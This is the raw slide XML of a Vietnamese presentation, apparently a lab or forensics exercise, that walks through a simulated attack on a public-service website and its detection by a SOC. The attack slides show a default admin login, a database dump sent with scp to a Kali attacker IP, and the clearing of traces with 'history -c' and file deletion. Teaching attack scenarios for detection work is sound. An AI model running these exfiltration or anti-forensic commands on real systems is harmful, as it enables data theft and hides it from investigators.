              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>+ User name: admin</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>+ Password: 123456</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="335" name="Google Shape;335;p33"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1311050" y="1595350"/>
            <a:ext cx="2346600" cy="246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0B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>5. Unauthorized Login:</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="336" name="Google Shape;336;p33" title="Screenshot 2026-05-27 024005.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3524325" y="2019450"/>
            <a:ext cx="7258050" cy="42576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40"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="341" name="Google Shape;341;p34"/>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5.2. Kịch Bản Tấn Công </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Giả Định:</a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="342" name="Google Shape;342;p34"/>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43" name="Google Shape;343;p34" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="723900" y="1471612"/>
            <a:ext cx="381000" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="344" name="Google Shape;344;p34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="723900" y="2039288"/>
            <a:ext cx="3327600" cy="2810700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115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IP máy attacker kali: 192.168.221.143</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="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Trên Victim:</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>+ Tạo dump database: mysqldump -u webuser -p public_service &gt; dump.sql</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>+ Nhập pass: 123456</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>+ Kiểm tra file file : ls -lh dump.sql</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Chuyển file ra ngoài: </a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>scp dump.sql kali@192.168.221.143:/tmp</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="345" name="Google Shape;345;p34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1311050" y="1595350"/>
            <a:ext cx="3051300" cy="246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0B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>6. Data Exfiltration Simulation:</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="346" name="Google Shape;346;p34"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="37586"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4572000" y="2091425"/>
            <a:ext cx="7010400" cy="1337575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="347" name="Google Shape;347;p34"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4699200" y="3600450"/>
            <a:ext cx="6045000" cy="3124200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="348" name="Google Shape;348;p34" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="723900" y="4912937"/>
            <a:ext cx="381000" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="349" name="Google Shape;349;p34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1311050" y="5036675"/>
            <a:ext cx="2270400" cy="246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0B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>7. Anti - forensic:</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="350" name="Google Shape;350;p34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="5597675"/>
            <a:ext cx="3327600" cy="916800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>- Xóa dấu vết: history -c</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>- Xóa dump: rm dump.sql</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt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54"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="355" name="Google Shape;355;p35" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="2001387"/>
            <a:ext cx="5324474" cy="4419599"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="356" name="Google Shape;356;p35" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6286500" y="2001387"/>
            <a:ext cx="5324474" cy="4419599"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="357" name="Google Shape;357;p35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="971550" y="2391912"/>
            <a:ext cx="47706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10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Biểu hiện phía Người Dùng</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="358" name="Google Shape;358;p35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="971550" y="2858637"/>
            <a:ext cx="4543500" cy="6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a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Trang dịch vụ công ghi nhận các báo cáo lỗi bất thường, làm gián đoạn nghiêm trọng trải nghiệm:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="359" name="Google Shape;359;p35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6677025" y="2391912"/>
            <a:ext cx="47706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10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Phát hiện phía Quản Trị &amp; SOC</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="360" name="Google Shape;360;p35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6677025" y="2858637"/>
            <a:ext cx="4543500" cy="6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a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Kiểm tra sơ bộ hệ thống mạng và máy chủ cho thấy dấu hiệu của một cuộc tấn công chủ đích:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="361" name="Google Shape;361;p35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1257300" y="3620637"/>
            <a:ext cx="4257600" cy="11079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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>+ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Cuối tháng 5/2026, 1 số người dùng báo cáo với cơ quan rằng thông bị của họ bất ngờ bị lộ nhưng không rõ nguyên nhân</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> và họ liên tục bị đe dọa.</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="364" name="Google Shape;364;p35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6962775" y="3620637"/>
            <a:ext cx="4257600"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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
